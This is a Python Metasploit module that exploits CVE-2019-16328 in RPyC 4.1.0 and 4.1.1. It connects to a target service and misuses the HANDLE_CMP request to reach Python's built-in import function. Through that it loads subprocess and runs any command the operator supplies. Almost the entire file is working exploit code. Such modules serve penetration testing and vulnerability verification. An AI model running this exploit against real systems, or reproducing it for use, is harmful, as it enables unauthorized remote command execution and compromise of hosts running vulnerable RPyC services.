#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
import logging

# extra modules
dependencies_missing = False
try:
    import rpyc
except ImportError:
    dependencies_missing = True

from metasploit import module


metadata = {
    'name': 'RPyC 4.1.0 through 4.1.1 Remote Command Execution',
    'description': '''
        This module allows remote command execution on RPyC versions 4.1.0 and 4.1.1.
        You will be able to execute a specified command on the target machine as
        the user running the RPyC service and view the output.
    ''',
    'authors': [
        'Aaron Meese <@ajmeese7>',  # Metasploit module
        'Jamie Hill-Daniel <@clubby789>'  # Original PoC
    ],
    'date': '2023-02-19',  # set to date of creation
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'cve', 'ref': '2019-16328'},
        {'type': 'url', 'ref': 'https://github.com/advisories/GHSA-pj4g-4488-wmxm'},
        {'type': 'url', 'ref': 'https://gist.github.com/clubby789/b681e7a40da070713c3760953d8df1c3'}
    ],
    'type': 'single_scanner',
    'options': {
        'RHOST': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'RPORT': {'type': 'port', 'description': 'Target port', 'required': True, 'default': 18812},
        'COMMAND': {'type': 'string', 'description': 'Command to execute', 'required': True, 'default': 'whoami'}
    }
}


def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['RHOST']))
    if dependencies_missing:
        logging.error('Module dependency (rpyc) is missing, cannot continue')
        return

    try:
        # Connect to remote host
        conn = rpyc.connect(args['RHOST'], args['RPORT'])
        module.log("Connected to RPyC service at {}:{}".format(args['RHOST'], args['RPORT']), 'success')
    except Exception as e:
        logging.error('{}'.format(e))
        return

    # Get a NetRef to the service
    conn.root

    def call_method(object, method, arg):
        # The remote will handle this with
        # `getattr(type(object), method)(object, arg)`
        return conn.sync_request(rpyc.core.consts.HANDLE_CMP, object, arg, method)

    def _getattr(object, name):
        # Call the internal __getattribute__
        return call_method(object, '__getattribute__', name)

    def _getitem(object, name):
        # Call the internal __getitem__
        return call_method(object, '__getitem__', name)

    try:
        # Retrieve service's class
        the_class = _getattr(conn._remote_root, '__class__')
        # Retrieve a reference to a function in the class
        a_func = _getattr(the_class, 'get_service_aliases')
        # Get the function's 'globals'; i.e. the Python globals
        globals = _getattr(a_func, '__globals__')
        # Retrieve a reference to the builtins module
        builtins = _getitem(globals, '__builtins__')
        # Retrieve a reference to the import function
        imp = _getitem(builtins, '__import__')
        # Import the subprocess module and get a reference to it
        sp = imp('subprocess')
        # Get a reference to getoutput
        remote_system = _getattr(sp, 'getoutput')

        # Execute remote command
        module.log("Executing command: {}".format(args['COMMAND']), 'success')
        result = remote_system(args['COMMAND'])
        module.log("Command result: {}".format(result), 'success')
    except AttributeError:
        # If the target is not vulnerable, the above code will raise an AttributeError:
        # "AttributeError: cannot access '__getattribute__'"
        module.log('Target is not vulnerable.', 'error')
        return


if __name__ == '__main__':
    module.run(metadata, run)
